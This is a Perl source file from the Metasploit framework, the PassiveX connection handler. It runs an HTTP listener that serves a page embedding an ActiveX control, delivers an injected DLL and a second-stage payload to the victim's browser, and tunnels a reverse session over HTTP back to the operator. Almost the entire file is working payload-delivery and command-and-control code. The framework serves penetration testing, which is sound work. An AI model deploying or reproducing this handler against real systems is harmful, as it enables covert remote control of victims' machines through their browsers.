###############
##
#
#    Name: PassiveXConnection.pm
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      Connection handler that handles HTTP requests for downloading
#      and tunneling connections over HTTP.  This code is not fault tolerant and
#      is very suspectible to latency leading to slow performance.  There are a
#      number of ways to improve it, but this is mainly meant as an
#      illustration.
#
##
###############

package Msf::PayloadComponent::PassiveXConnection;

use strict;
use base 'Msf::PayloadComponent::ConnectionHandler';
use FindBin qw{$RealBin};
use IO::Socket::INET;

my $info = 
{
	'UserOpts'          =>
		{
			'PXHTTPHOST'  => [ 1, 'ADDR', 'Local HTTP listener hostname',                                        ],
			'PXHTTPPORT'  => [ 1, 'PORT', 'Local HTTP listener port',     "8080"                                 ],
			'PXAXDLL'     => [ 1, 'DATA', 'ActiveX DLL to Inject',        "$RealBin/data/passivex/passivex.dll"  ],
			'PXAXCLSID'   => [ 1, 'DATA', 'ActiveX CLSID',                "B3AC7307-FEAE-4e43-B2D6-161E68ABA838" ],
			'PXAXVER'     => [ 1, 'DATA', 'ActiveX DLL Version',          "-1,-1,-1,-1"                          ],
		},
	'MultistageInline'  => 1,
	'Keys'              => [ 'reversehttp', 'tunnel' ],
};

sub new 
{
	my $class = shift;
	my $self  = $class->SUPER::new(@_);

	$self->_Info($self->MergeHashRec($info, $self->_Info));

	return($self);
}

#
# Start the HTTP listener
#
sub SetupHandler 
{
	my $self = shift;
	my $httpHost = $self->GetHttpHost();
	my $httpPort = $self->GetHttpPort();
	my $httpSelect;
	my $httpSock;

	$self->PrintLine("[*] Starting PassiveX Handler on $httpHost:$httpPort.");

	# Create the HTTP listener
	$httpSock = IO::Socket::INET->new(
		LocalHost => $httpHost,
		LocalPort => $httpPort,
		Proto     => 'tcp',
		ReuseAddr => 1,
		Listen    => 1);

	if (not defined($httpSock))
	{
		$self->PrintLine("[-] Failed to start the HTTP listener, $!.");
		return undef;
	}

	# Create a select instance on the HTTP lsitener
	$httpSelect = IO::Select->new($httpSock);

	$self->{'pxHttpListener'} = $httpSock;
	$self->{'pxHttpSelector'} = $httpSelect;

	return;
}

#
# Watch for HTTP requests
#
sub CheckHandler 
{
	my $self  = shift;
	my @ready = $self->GetHttpSelector()->can_read(.5);
	my $res   = 0;

	# If there's a connection to be had...
	if (@ready)
	{
		my $csock = $ready[0]->accept();

		if (not defined($csock))
		{
			$self->PrintLine("[-] Failed to accept client connection, $!.");
			return 0;
		}

		# Process the client's HTTP request
		$res = $self->ProcessHttpRequest(
				client => $csock);

		# If we've completed the ActiveX DLL injection and this is a multistage
		# payload, initiate the handlers for the second stage so that things will
		# work transparently
		if (($res) and
		    ($self->IsMultistage()))
		{
			$self->PrintLine("[*] Starting local TCP abstraction layer...");

			# Flag the stage as being handled inline
			$self->InlineStage(1);

			# Create the local listener that will serve as our logical TCP
			# connection
			$res = $self->CreateTcpAbstraction();

			# Monitor traffic from both the local listener and the HTTP tunnel and
			# pipe data between the two
			$self->StartMonitoringTunnelData() if ($res);

		}
		elsif ($res)
		{
			$self->PrintLine("[*] Standalone ActiveX control successfully transmitted.");
		}
	}
			
	return $res;
}

#
# Cleanup the HTTP listener and all that other stuff
#
sub ShutdownHandler 
{
	my $self = shift;

	if ($self->{'PxChildPid'})
	{
		kill('KILL', $self->{'PxChildPid'});

		$self->{'PxChildPid'} = 0;
	}

	# Close the listener if it's valid
	if (defined($self->{'pxHttpListener'}))
	{
		$self->{'pxHttpListener'}->close;

		$self->{'pxHttpListener'} = undef;
	}

	$self->PrintLine('[*] Exiting PassiveX Handler.');
}

##
#
# Internal routines
#
##

#
# Processes an HTTP request from a client connection and handles it accordingly
#
sub ProcessHttpRequest
{
	my $self = shift;
	my ($client) = @{{@_}}{qw/client/};
	my $request;
	my $close = 1;
	my $res = 0;

	# Read in the entire HTTP request.  Could be made better on high latency
	# connections
	$request= $self->ReadHttpRequest(
		client => $client);

	if ((defined($request)) and
	    (defined($request->{'uri'})))
	{
		# Handle the HTTP request for the main page
		if ($request->{'uri'} eq '/')
		{
			# Format is http://[PXHTTPHOST]:[PXHTTPPORT]/passivex.dll
			my $url = 'http://' . $self->GetHttpHost() . ":" . $self->GetHttpPort() . "/passivex.dll";
			my $clsid = $self->GetVar('PXAXCLSID');
			my $ver   = $self->GetVar('PXAXVER');
			
			$self->PrintLine('[*] Sending PassiveX main page to client...');

			print $client
				"HTTP/1.1 200 OK\r\n" .
				"Connection: close\r\n" .
				"Content-type: text/html\r\n" .
				"\r\n" .
				"<html>" .
					"<object classid=\"CLSID:$clsid\" codebase=\"$url#$ver\">" .
					(($self->IsMultistage()) ?	
						"<param name=\"HttpHost\" value=\"" . $self->GetHttpHost() . "\">" .
						"<param name=\"HttpPort\" value=\"" . $self->GetHttpPort() . "\">" .
						"<param name=\"DownloadSecondStage\" value=\"1\">" :
						"") . 
					"</object>" .
				"</html>";
		}
		# If the request was for the ActiveX control itself...
		elsif ($request->{'uri'} eq '/passivex.dll')
		{
			my $contents = '';
			my $path = $self->GetActiveXPath();
			my $dll;

			if (not defined(open($dll, "<$path")))
			{
				$self->PrintLine('[-] Failed to open PassiveX image file.');
				return undef;
			}

			# Serialize the file
			while (<$dll>)
			{
				$contents .= $_;
			}

			$self->PrintLine("[*] Sending PassiveX DLL in HTTP response (" . length($contents) . " bytes)...");

			print $client
				"HTTP/1.1 200 OK\r\n" .
				"Connection: close\r\n" .
				"Content-type: application/octet-stream\r\n" .
				"\r\n" .
				$contents;
		}
		# If the request was to download the second stage payload, do it for them
		elsif (($request->{'uri'} eq '/stage') and
		       ($self->IsMultistage()))
		{
			my $payload = $self->BuildPayload($self->StagePayload);

			$self->PrintLine("[*] Sending second stage (" . length($payload) . " bytes)");

			print $client
				"HTTP/1.1 200 OK\r\n" .
				"Content-Length: " . length($payload) . "\r\n" .
				"Connection: close\r\n" .
				"\r\n" .
				$payload;

			# Now that we've sent the second stage, start up the stage thread
			$res = 1;
		}
		elsif (($request->{'uri'} eq '/tunnel_in') or
		       ($request->{'uri'} eq '/tunnel_out'))
		{
			$self->PrintLine("[*] Got tunnel request, starting stage...");

			if ($request->{'uri'} eq '/tunnel_out')
			{
				$self->{'pxStagedHttpRequest'} = $request;
				$self->{'pxStagedHttpClient'}  = $client;
			}

			$close = 0;
			$res   = 1;
		}
		else
		{
			$self->PrintLine("[-] HTTP request for invalid URI: " . $request->{'uri'});
		}
	}
	else
	{
		$self->PrintLine("[*] Malformed HTTP request received...");
	}
		
	if ($close)
	{
		$client->shutdown(2);
		$client->close() 
	}

	return $res;
}

#
# Reads in an entire HTTP request header
#
sub ReadHttpRequest
{
	my $self = shift;
	my ($client) = @{{@_}}{qw/client/};
	my $request = { };
	my $size = 0;
	my $line;
	my $cmd = $self->ReadSocketLineNoCache(
		client => $client);

	return undef if (not defined($cmd));

	($request->{'method'}, 
	 $request->{'uri'},
	 $request->{'proto'}) = split / /, $cmd;

	$request->{'attributes'} = {};
	$request->{'body'}       = '';

	while (defined($line = $self->ReadSocketLineNoCache(
		client => $client)))
	{
		last if ($line eq "\r\n");

		$line =~ s/(\r|\n)//g;
	
		my ($var, $val) = split /: /, $line;

		$request->{'attributes'}->{lc($var)} = $val;
	}
	
	# Check to see if the request has a content length
	$size = int($request->{'attributes'}->{'content-length'});

	# While there's data left in the body...
	while ($size > 0)
	{
		my $buffer;
		my $bytes;

		if (not defined(recv($client, $buffer, $size, 0)))
		{
			$self->PrintLine("[-] Failed to read body chunk from connection.");
			return undef;
		}

		$bytes = length($buffer);

		$request->{'body'} .= $buffer;
		$size              -= $bytes;

		last if ($bytes == 0);
	}

	return $request;
}

##
#
# Local TCP abstraction layer
#
##

#
# Creates a TCP listener on a random port on localhost and establishes a single
# client connection to it.  This client connection is then used as the remote
# in/out handles for the second stage payloads.
#
sub CreateTcpAbstraction
{
	my $self = shift;
	my $rawServerSideSock;
	my $clientSideSock;
	my $serverSideSock;
	my $listenerSock;
	my $currentPort;
	my $attempts = 0;
	my $res = 0;

	# Keep trying until we stop sucking
	while ((!$res) and
	       ($attempts++ < 256))
	{
		# Pick a random port
		$currentPort = int(rand(65535));

		# Try to listen on it
		$listenerSock = IO::Socket::INET->new(
			LocalAddr => "127.0.0.1",
			LocalPort => $currentPort,
			Listen    => 1);

		# If we fail, try again
		next if (not defined($listenerSock));

		$clientSideSock = IO::Socket::INET->new(
			PeerAddr  => "127.0.0.1",
			PeerPort  => $currentPort);

		# If for some reason the client can't connect, cry home to mommy
		next if (not defined($clientSideSock));

		# Now, accept the client connection
		$serverSideSock = $listenerSock->accept();

		# Stash the socket away for safe keeping
		$self->{'pxLocalTcpClientSock'} = $clientSideSock;
		$self->{'pxLocalTcpServerSock'} = $serverSideSock;

		# Explicit declaration of the outbound sendq
		$self->{'pxLocalOutboundSendq'} = undef;

		# Woop!
		$res = 1;
	}

	# If we were successful, set the client side socket as the remote in/out
	if ($res)
	{
		$clientSideSock->autoflush(1);

		$self->PipeRemoteIn($clientSideSock);
		$self->PipeRemoteOut($clientSideSock);
	}

	return $res;
}

#
# Forks off a child process that is responsible for managing the piping of data
# between the local TCP client and the HTTP tunnel
#
sub StartMonitoringTunnelData
{
	my $self = shift;
	my $pid = fork();

	# If parent or error, return up...
	if ($pid)
	{
		$self->{'PxChildPid'} = $pid;

		return 1;
	}

	$self->MonitorTunnelData();

	return 0;
}

#
# Monitors for data on both the local TCP client (server side) as well as the
# HTTP listener such that data can be piped and translated between the two
#
sub MonitorTunnelData
{
	my $self = shift;
	my $selector = IO::Select->new();
	my $request;
	my @ready;

	# Initialize the selector
	$selector->add($self->GetHttpListenerSock());
	$selector->add($self->GetServerSideSock());

	# First, check to see if we have a staged HTTP request.  if so, let's process
	# it right off the bat so we're cool and all that.
	if (defined($request = $self->GetStagedHttpRequest()))
	{
		$self->ProcessHttpTunnelClient(
			client  => $self->GetStagedHttpClient(),
			request => $request);

		$self->{'pxStagedHttpRequest'} = undef;
		$self->{'pxStagedHttpClient'}  = undef;
	}

	# Forever until death do us abort
	while (1)
	{
		@ready = $selector->can_read(.5);
		
		next if (!@ready);

		foreach my $sock (@ready)
		{
			if ($sock == $self->GetHttpListenerSock())
			{
				my $client = $self->GetHttpListenerSock()->accept();

				next if (not defined($client));

				$self->ProcessHttpTunnelClient(
					client => $client);
			}
			elsif ($sock == $self->GetServerSideSock())
			{
				if (not defined($self->ProcessLocalTcpClient()))
				{
					last;
				}
			}
		}
	}
}

#
# Processes an HTTP request and performs the appropriate action based on the URI
# that was requested
#
sub ProcessHttpTunnelClient
{
	my $self = shift;
	my ($client, $request) = @{{@_}}{qw/client request/};

	$self->PrintDebugLine(3, "PX: Reading in HTTP request...");

	# If the request was not passed to us, read it now
	$request = $self->ReadHttpRequest(
		client => $client) if (not defined($request));

	# Hmm, invalid request?  Sucky.
	if (not defined($request))
	{
		$client->shutdown(2);
		$client->close();
		return 0;
	}

	$self->PrintDebugLine(3, "PX: Processing HTTP request: " . $request->{'uri'});

	# If the remote side is passing data in, pass it along to the server side of
	# the local TCP connection
	if ($request->{'uri'} eq '/tunnel_in')
	{
		my $data = $request->{'body'};

		# Send the entire contents of the inbound data to the server side of
		# the connection
		if (length($data))
		{
			$self->PrintDebugLine(3, "PX: Transmitting " . length($data) . " bytes to local half.");

			$self->WriteFull(
				sock   => $self->GetServerSideSock(),
				buf    => $data,
				length => length($data));
		}

		# Print a blank response
		print $client
			"HTTP/1.1 200 OK\r\n" .
			"Content-Length: 0\r\n" .
			"\r\n";

		$self->PrintDebugLine(3, "PX: Transmitted " . length($data) . " bytes to local half.");

		$client->shutdown(2);
		$client->close();
	}
	# Otherwise, if the remote side wants outbound data, check to see if we have
	# any, otherwise queue the data for later transmission
	elsif ($request->{'uri'} eq '/tunnel_out')
	{
		my $data = $self->GetOutboundSendBuffer();

		# If we have data to send transmit it now.
		if (defined($data))
		{
			$self->PrintDebugLine(3, "PX: Flushing outbound sendq.");

			$self->TransmitLocalDataToHttpClient(
				client => $client,
				data   => $data);

			$self->ResetOutboundSendBuffer();
		}
		# Stash the connection for later reference when we have data to send
		else
		{
			$self->PrintDebugLine(3, "PX: Stashing outbound HTTP connection.");

			$self->SetTunnelOutHttpClient(
				client => $client);
		}
	}

	return 1;
}

#
# Process data coming in on the local TCP client connection
#
sub ProcessLocalTcpClient
{
	my $self = shift;
	my $outc = $self->GetTunnelOutHttpClient();
	my $data = undef;

	return undef if (not defined(recv($self->GetServerSideSock(), $data, 32768, 0)));

	# If we already have an HTTP client that is waiting for outbound tunnel data,
	# pass it right along to them
	if ($outc)
	{
		$self->PrintDebugLine(3, "PX: Sending " . length($data) . " bytes of data to remote half.");

		$self->SetTunnelOutHttpClient(
			client => undef);

		$self->TransmitLocalDataToHttpClient(
			client => $outc,
			data   => $data);
	}
	# Otherwise, we queue it for future transmission
	else
	{
		$self->PrintDebugLine(3, "PX: Enqueueing " . length($data) . " bytes of data to be sent to remote half.");

		$self->AppendToOutboundBuffer(
			data => $data);
	}

	return 1;
}

#
# Transmits local data in the form of an HTTP response to the remote HTTP 
# client
#
sub TransmitLocalDataToHttpClient
{
	my $self = shift;
	my ($client, $data) = @{{@_}}{qw/client data/};
	my $response =
		"HTTP/1.1 200 OK\r\n" .
		"Content-Length: " . length($data) . "\r\n" .
		"Content-Type: text/plain\r\n" .
		"Connection: close\r\n" .
		"\r\n" .
		"$data";
	my $length = length($response);

	$self->PrintDebugLine(3, "PX: Transmitting " . length($data) . " bytes to remote half.");

	# Write the entire response
	$self->WriteFull(
		sock   => $client,
		buf    => $response,
		length => $length);
	
	$self->PrintDebugLine(3, "PX: Transmitted " . length($data) . " bytes to remote half.");

	$client->shutdown(2);
	$client->close();
}

##
#
# Utility
#
##

#
# Reads a line from a socket without disturbing the recvq that comes 
# after the current end of line terminator.  If there is no end of
# line character available, undef is returned.
#
sub ReadSocketLineNoCache
{
	my $self = shift;
	my ($client) = @{{@_}}{qw/client/};
	my $finalBuffer = "";
	my $tempBuffer;

	# Static length, but who cares.  We're only reading a few HTTP
	# headers.
	while (defined(recv($client, $tempBuffer, 8192, MSG_PEEK)))
	{
		my $offset = index($tempBuffer, "\r\n");
		my $eoln   = 0;

		$tempBuffer = undef;

		if ($offset >= 0)
		{
			$offset += 2;
			$eoln    = 1;
		}
		else
		{
			$offset  = 8192;
		}
			
		if (not defined(recv($client, $tempBuffer, $offset, 0)))
		{
			$finalBuffer = undef;
			last;
		}

		$finalBuffer .= $tempBuffer;

		last if ($eoln);
	}

	return $finalBuffer;
}

#
# Writes the entire contents of the buffer to the supplied socket
#
sub WriteFull
{
	my $self = shift;
	my ($sock, $buf, $length) = @{{@_}}{qw/sock buf length/};
	my $offset = 0;
	my $left = $length;
	my $sent;

	while ($offset < $length)
	{
		$sent = syswrite($sock, substr($buf, $offset, $left), $left, 0);

		if (not defined($sent))
		{
			$offset = -1;

			last;
		}

		$offset += $sent;
		$left   -= $sent;
	}

	return $offset;
}

##
#
# Getters/Setters
#
##

#
# Returns the HTTP host that should be bound to
#
sub GetHttpHost
{
	my $self = shift;
	my $host = $self->GetVar('PXHTTPHOST');

	$host = "0.0.0.0" if (not defined($host));

	return $host;
}

#
# Returns the HTTP listener socket
#
sub GetHttpListenerSock
{
	my $self = shift;

	return $self->{'pxHttpListener'};
}

#
# Returns the HTTP listener IO::Select object instance
#
sub GetHttpSelector
{
	my $self = shift;

	return $self->{'pxHttpSelector'};
}

#
# Returns the HTTP port that should be bound to
#
sub GetHttpPort
{
	my $self = shift;
	my $port = $self->GetVar('PXHTTPPORT');

	$port = 8080 if (not defined($port));

	return $port;
}

#
# Returns the path to the ActiveX DLL that is to be injected
#
sub GetActiveXPath
{
	my $self = shift;
	my $path = $self->GetVar('PXAXDLL');

	$path = "$RealBin/data/passivex/passivex.dll" if (not defined($path));

	return $path;
}

#
# Returns a staged HTTP request, if any, that was processed by the connection
# object but should have been handled by a stager
#
sub GetStagedHttpRequest
{
	my $self = shift;

	return $self->{'pxStagedHttpRequest'};
}

#
# Holds information about a queued staged http request for later processing
#
sub GetStagedHttpClient
{
	my $self = shift;

	return $self->{'pxStagedHttpClient'};
}

#
# Caches the outbound tunnel client for later referencing when outbound data
# is available
#
sub SetTunnelOutHttpClient
{
	my $self = shift;
	my ($client) = @{{@_}}{qw/client/};

	$self->{'pxHttpTunnelOutClient'} = $client;
}

#
# Gets the client HTTP connection that should be used to tunnel outbound data
#
sub GetTunnelOutHttpClient
{
	my $self = shift;

	return $self->{'pxHttpTunnelOutClient'};
}

#
# Returns the client side socket for the local TCP connection
#
sub GetClientSideSock
{
	my $self = shift;

	return $self->{'pxLocalTcpClientSock'};
}

#
# Returns the server side socket for the local TCP connection
#
sub GetServerSideSock
{
	my $self = shift;

	return $self->{'pxLocalTcpServerSock'};
}

#
# Get the outbound sendq buffer
#
sub GetOutboundSendBuffer
{
	my $self = shift;

	return $self->{'pxLocalOutboundSendq'};
}

#
# Append data to the sendq
#
sub AppendToOutboundBuffer
{
	my $self = shift;
	my ($data) = @{{@_}}{qw/data/};

	$self->{'pxLocalOutboundSendq'} .= $data;
}

#
# Zero out the sendq
#
sub ResetOutboundSendBuffer
{
	my $self = shift;

	$self->{'pxLocalOutboundSendq'} = undef;
}

#
# Returns whether or not this connection is dealing with a staged payload
#
sub IsMultistage
{
	my $self = shift;

	return $self->_Info->{'Multistage'};
}

#
# Wait 30 seconds to give time for the DLL to register
#
sub ExtraDelay
{
	my $self = shift;

	select(undef, undef, undef, 30);
}

1;
